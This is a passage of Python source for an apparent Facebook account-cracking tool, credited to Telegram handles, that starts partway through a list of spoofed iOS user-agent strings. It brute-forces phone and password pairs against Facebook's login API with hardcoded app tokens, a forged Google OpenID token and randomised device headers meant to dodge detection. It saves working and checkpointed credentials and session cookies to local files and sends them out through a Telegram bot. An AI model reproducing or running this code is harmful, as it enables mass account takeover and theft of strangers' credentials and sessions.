"[FBAN/FBIOS;FBAV/440.0.0.27.105;FBBV/384763052;FBDV/iPhone13,1;FBMD/iPhone;FBSN/iOS;FBSV/15.4.1;FBSS/3;FBID/phone;FBLC/fr_FR;FBOP/5;FBRV/591123541]",
"[FBAN/FBIOS;FBAV/504.0.0.62.85;FBBV/127474299;FBDV/iPhone13,2;FBMD/iPhone;FBSN/iOS;FBSV/17.6.1;FBSS/3;FBID/phone;FBLC/fr_FR;FBOP/5;FBRV/395026486]",
"[FBAN/FBIOS;FBAV/412.0.0.40.114;FBBV/273933130;FBDV/iPhone10,4;FBMD/iPhone;FBSN/iOS;FBSV/11.3;FBSS/3;FBID/phone;FBLC/fr_FR;FBOP/5;FBRV/123125352]",
"[FBAN/FBIOS;FBAV/503.0.0.56.104;FBBV/271372904;FBDV/iPhone8,2;FBMD/iPhone;FBSN/iOS;FBSV/13.6;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/622914961]",
"[FBAN/FBIOS;FBAV/493.0.0.55.216;FBBV/690359086;FBDV/iPhone15,4;FBMD/iPhone;FBSN/iOS;FBSV/16.6.1;FBSS/3;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/579969514]",
"[FBAN/FBIOS;FBAV/485.0.0.50.105;FBBV/482199137;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/13.6;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/153988854]",
"[FBAN/FBIOS;FBAV/485.0.0.50.105;FBBV/640441830;FBDV/iPhone13,1;FBMD/iPhone;FBSN/iOS;FBSV/16.3.1;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/571896411]",
"[FBAN/FBIOS;FBAV/500.0.0.52.98;FBBV/612972391;FBDV/iPhone10,4;FBMD/iPhone;FBSN/iOS;FBSV/11.3;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/662105166]",
"[FBAN/FBIOS;FBAV/504.0.0.62.85;FBBV/493832986;FBDV/iPhone15,4;FBMD/iPhone;FBSN/iOS;FBSV/16.3.1;FBSS/3;FBID/phone;FBLC/fr_FR;FBOP/5;FBRV/558433309]",
"[FBAN/FBIOS;FBAV/485.0.0.50.105;FBBV/533751644;FBDV/iPhone9,2;FBMD/iPhone;FBSN/iOS;FBSV/11.2;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/537061073]",
"[FBAN/FBIOS;FBAV/504.0.0.62.85;FBBV/696470458;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/16.6.1;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/691692687]",
"[FBAN/FBIOS;FBAV/504.0.0.62.85;FBBV/252873418;FBDV/iPhone14,7;FBMD/iPhone;FBSN/iOS;FBSV/15.4.1;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/586925790]",
"[FBAN/FBIOS;FBAV/412.0.0.40.114;FBBV/655743400;FBDV/iPhone7,1;FBMD/iPhone;FBSN/iOS;FBSV/16.5.1;FBSS/3;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/378352507]",
"[FBAN/FBIOS;FBAV/504.0.0.62.85;FBBV/321115103;FBDV/iPhone15,4;FBMD/iPhone;FBSN/iOS;FBSV/15.4.1;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/495307678]",
"[FBAN/FBIOS;FBAV/412.0.0.40.114;FBBV/157026284;FBDV/iPhone13,2;FBMD/iPhone;FBSN/iOS;FBSV/16.5.1;FBSS/3;FBID/phone;FBLC/fr_FR;FBOP/5;FBRV/470228572]",
"[FBAN/FBIOS;FBAV/500.0.0.52.98;FBBV/182472361;FBDV/iPhone10,4;FBMD/iPhone;FBSN/iOS;FBSV/16.3.1;FBSS/3;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/178080637]",
"[FBAN/FBIOS;FBAV/485.0.0.50.105;FBBV/273766524;FBDV/iPhone13,1;FBMD/iPhone;FBSN/iOS;FBSV/16.7.10;FBSS/3;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/462596921]",
"[FBAN/FBIOS;FBAV/500.0.0.52.98;FBBV/203025455;FBDV/iPhone15,4;FBMD/iPhone;FBSN/iOS;FBSV/16.6.1;FBSS/3;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/125494462]",
"[FBAN/FBIOS;FBAV/493.0.0.55.216;FBBV/273492162;FBDV/iPhone15,4;FBMD/iPhone;FBSN/iOS;FBSV/18.3.1;FBSS/3;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/303325485]",
"[FBAN/FBIOS;FBAV/501.0.0.49.107;FBBV/128796244;FBDV/iPhone14,7;FBMD/iPhone;FBSN/iOS;FBSV/15.7.8;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/494262473]",
"[FBAN/FBIOS;FBAV/501.0.0.49.107;FBBV/540220430;FBDV/iPhone14,5;FBMD/iPhone;FBSN/iOS;FBSV/11.2;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/448067552]",
"[FBAN/FBIOS;FBAV/493.0.0.55.216;FBBV/574715774;FBDV/iPhone15,4;FBMD/iPhone;FBSN/iOS;FBSV/17.6.1;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/453828061]",
"[FBAN/FBIOS;FBAV/501.0.0.49.107;FBBV/611740892;FBDV/iPhone13,1;FBMD/iPhone;FBSN/iOS;FBSV/11.3;FBSS/3;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/689520904]",
"[FBAN/FBIOS;FBAV/440.0.0.27.105;FBBV/120198192;FBDV/iPhone13,1;FBMD/iPhone;FBSN/iOS;FBSV/15.4.1;FBSS/3;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/424259095]",
"[FBAN/FBIOS;FBAV/412.0.0.40.114;FBBV/372658052;FBDV/iPhone10,4;FBMD/iPhone;FBSN/iOS;FBSV/11.3;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/365986467]",
"[FBAN/FBIOS;FBAV/504.0.0.62.85;FBBV/407741025;FBDV/iPhone7,1;FBMD/iPhone;FBSN/iOS;FBSV/16.6.1;FBSS/3;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/291691285]",
"[FBAN/FBIOS;FBAV/485.0.0.50.105;FBBV/470415110;FBDV/iPhone10,4;FBMD/iPhone;FBSN/iOS;FBSV/16.5.1;FBSS/3;FBID/phone;FBLC/fr_FR;FBOP/5;FBRV/114781401]",
"[FBAN/FBIOS;FBAV/504.0.0.62.85;FBBV/441703781;FBDV/iPhone9,2;FBMD/iPhone;FBSN/iOS;FBSV/18.3.2;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/348206892]",
"[FBAN/FBIOS;FBAV/440.0.0.27.105;FBBV/691328087;FBDV/iPhone7,1;FBMD/iPhone;FBSN/iOS;FBSV/18.3.2;FBSS/3;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/384637466]",
"[FBAN/FBIOS;FBAV/504.0.0.62.85;FBBV/565561771;FBDV/iPhone8,2;FBMD/iPhone;FBSN/iOS;FBSV/16.6.1;FBSS/3;FBID/phone;FBLC/fr_FR;FBOP/5;FBRV/108390546]",
"[FBAN/FBIOS;FBAV/503.0.0.56.104;FBBV/340234293;FBDV/iPhone13,1;FBMD/iPhone;FBSN/iOS;FBSV/11.2;FBSS/3;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/460661291]",
"[FBAN/FBIOS;FBAV/501.0.0.49.107;FBBV/596981231;FBDV/iPhone14,5;FBMD/iPhone;FBSN/iOS;FBSV/18.3.2;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/398396191]",
"[FBAN/FBIOS;FBAV/493.0.0.55.216;FBBV/650548309;FBDV/iPhone15,4;FBMD/iPhone;FBSN/iOS;FBSV/17.6.1;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/109684571]",
"[FBAN/FBIOS;FBAV/504.0.0.62.85;FBBV/612546532;FBDV/iPhone8,2;FBMD/iPhone;FBSN/iOS;FBSV/15.7.8;FBSS/3;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/149601111]",
"[FBAN/FBIOS;FBAV/504.0.0.62.85;FBBV/620903684;FBDV/iPhone15,4;FBMD/iPhone;FBSN/iOS;FBSV/16.3.1;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/439619246]",
"[FBAN/FBIOS;FBAV/500.0.0.52.98;FBBV/688734853;FBDV/iPhone14,5;FBMD/iPhone;FBSN/iOS;FBSV/18.3.2;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/682916595]",
"[FBAN/FBIOS;FBAV/501.0.0.49.107;FBBV/147054806;FBDV/iPhone15,4;FBMD/iPhone;FBSN/iOS;FBSV/16.3.1;FBSS/3;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/406709814]"])
    return random.choice(u)

def get_uid(phone, pas):
    global idd
    max_retries = 3  
    
    for attempt in range(max_retries):
        cookie_string = ""  
        idd = ''
        iddd = ''
        
        current_timestamp = int(time.time())
        pwd_enc = f"#PWD_FB4A:0:{current_timestamp}:{pas}"
        url = "https://graph.facebook.com/auth/login"
        payload = {
            "locale": "ar_AR",
            "format": "json",
            "email": phone,
            "password": pwd_enc,
            "access_token": "257637621624717|7e73d6961c0c8fab39f62afdfb77f96b",
            "generate_session_cookies": 1
        }
        headers = {
            'User-Agent': u(),
            'Accept-Encoding': "gzip",
            'content-type': "application/json;charset=utf-8",
        }
        
        try:
            responsee = requests.post(url, data=json.dumps(payload), headers=headers, timeout=15).json()
        except:
            continue
        
        try:
            idd = responsee.get('error', {}).get('error_data', {}).get('uid')
        except:
            idd = ''
        
        try:
            iddd = responsee.get('uid')
        except:
            iddd = ''
        
        cookies = []
        if 'session_cookies' in responsee:
            for cookie in responsee['session_cookies']:
                cookies.append(f"{cookie['name']}={cookie['value']}")
            cookie_string = ';'.join(cookies)
        
        # نرجع responsee مع الباقي عشان نفحصه برا
        return idd, iddd, cookie_string, responsee
    
    return '', '', '', {}

def chick_Salh(phone, pas):
    global hit, bad, CP, cok, apps, dates, apps2, dates2, cookie_string, idd, iddd
    device_id = str(uuid.uuid4())
    adid = str(uuid.uuid4())
    data = {"adid": str(uuid.uuid4()),'format': 'json','device_id': str(uuid.uuid4()),'family_device_id': str(uuid.uuid4()),'secure_family_device_id': str(uuid.uuid4()),'cpl': 'true','try_num': '1','email': phone,'password': pas,'method': 'auth.login','generate_session_cookies': '1','sim_serials': "['80973453345210784798']",'openid_flow': 'android_login','openid_provider': 'google','openid_emails': "['01710940017']",'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']",'error_detail_type': 'button_with_disabled','source': 'account_recovery','locale': 'fr_DZ','client_country_code': 'DZ','fb_api_req_friendly_name': 'authenticate','fb_api_caller_class': 'AuthOperations$PasswordAuthOperation','access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
    data = {'adid':adid,
        'email':phone,
        'password':pas,
        'cpl':'true',
        'credentials_type':'device_based_login_password',
        "source": "device_based_login",
        'error_detail_type':'button_with_disabled',
        'format':'json',
        'generate_session_cookies':'1',
        'generate_analytics_claim':'1',
        'generate_machine_id':'1',
        "family_device_id": str(uuid.uuid4()),
        "advertiser_id": str(uuid.uuid4()),
        "locale":"fr_DZ","client_country_code":"DZ",
        "device_id": str(uuid.uuid4()),
        "method": "auth.login",
        "api_key": "882a8490361da98702bf97a021ddc14d",
        "fb_api_req_friendly_name": "authenticate",
        "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
    head = {'content-type':'application/x-www-form-urlencoded','Host': 'graph.facebook.com','x-fb-sim-hni':str(random.randint(40000,50000)),'X-FB-Connection-Type': 'MOBILE.LTE','Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','user-agent': u(),'x-fb-net-hni':str(random.randint(40000,50000)),'x-fb-device-group': '5120','x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62','x-fb-connection-bandwidth':str(random.randint(400000,500000)),'x-fb-connection-quality':'EXCELLENT','X-FB-Client-IP': 'True','X-FB-Server-Cluster': 'True','x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62','x-fb-friendly-name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags': 'graphservice', 'accept-encoding':'gzip, deflate','x-fb-http-engine':     'Liger'}
    url = 'https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true'
    response = requests.post(url, data=data, headers=head, allow_redirects=False).json()
    response_str = str(response)
    
    if "session_key" in response_str or 'access_token' in response_str:
        hit += 1
        ckkk = ";".join(i["name"]+"="+i["value"] for i in response["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie_string = f"sb={ssbb};{ckkk}"
        get_apps(cookie_string)
        ssend_tele(phone, pas, idd, cookie_string, apps, dates, apps2, dates2)
        print(اعادة + f'{اخضر}GOD ACCUONT {phone} | {pas} \n{cookie_string} | {اعادة}{ذهبي}~ @salhpy')
        message = f"""
ACCUONT OK
phone: {phone}
pas: {pas}
DEV: @salhpy
link: https://www.facebook.com/profile.php?id={idd}
cookies: {cookie_string}
app: {apps} | {dates}
{apps2} | {dates2}
Brother: @r77cr
BY • https://t.me/S_S_lN
Developer • @salhpy	
"""
        try:
            requests.post(f"https://api.telegram.org/bot{token}/sendMessage", 
                         params={"chat_id": ID, "text": message}, timeout=10)
        except:
            pass

        ssend_tele(phone, pas, idd, cookie_string, apps, dates, apps2, dates2)
        fc = "/storage/emulated/0/"
        ok_file = os.path.join(fc, 'Salh_OK.txt')
        with open(ok_file, 'a', encoding='utf-8') as f:
            f.write(f"{phone}|{pas}\nCookie: {cookie_string}\nLink: https://www.facebook.com/profile.php?id={idd}\nApps: {apps}|{dates}\nExpired: {apps2}|{dates2}\nBY: @salhpy\n{'-'*40}\n")
    
    elif 'www.facebook.com' in response_str:
                CP += 1
                ssend_teleG(phone, pas, idd, cookie_string, apps, dates, apps2, dates2)
                print(اعادة + f'{ازرق}CP ACCUONT {phone} | {pas} {اعادة}{ذهبي} ~ {اعادة}{ازرق} @salhpy')
                
                message = f"""
ACCUONT CP
phone: {phone}
pas: {pas}
ID=https://www.facebook.com/profile.php?id={idd}
DEV: @salhpy
Brother: @r77cr
BY • https://t.me/S_S_lN
Developer • @salhpy
"""
                
                try:
                    requests.post(f"https://api.telegram.org/bot{token}/sendMessage", 
                    params={"chat_id": ID, "text": message})
                except:
                    pass
                
                ssend_teleG(phone, pas, idd, cookie_string, apps, dates, apps2, dates2)
                fc = "/storage/emulated/0/"
                cp_file = os.path.join(fc, 'Salh_cp.txt')
                with open(cp_file, 'a', encoding='utf-8') as f:
                    f.write(f"{phone}|{pas}\n\nLink: https://www.facebook.com/profile.php?id={idd}\nBY: @salhpy\n{'-'*40}\n")

    else:
        bad += 1
        print(اعادة + f'\r{احمر}BAD ACCOUNT | Bad {bad} | CP {CP} | Hit {hit} | {اعادة}{ذهبي} {pas} ~{اعادة}{ازرق} @salhpy', end='\r')

tele()

def tt():
    while True:
        phone, pas = gin()
        chick_Salh(phone, pas)

logn()
for i in range(3):
    t = threading.Thread(target=tt)
    t.start()
